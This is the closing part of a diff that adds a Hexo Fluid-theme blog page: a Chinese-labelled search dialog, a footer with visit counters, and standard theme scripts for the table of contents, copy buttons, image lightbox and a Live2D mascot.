+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://M0cK1nG-b1Rd.github.io" target="_blank" rel="nofollow noopener"><span>M0cK1nG-b1Rd</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Powered by Hexo&Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":250,"height":500,"hOffset":-30,"vOffset":-150},"mobile":{"show":true,"scale":0.5},"log":false});</script></body>
+</html>
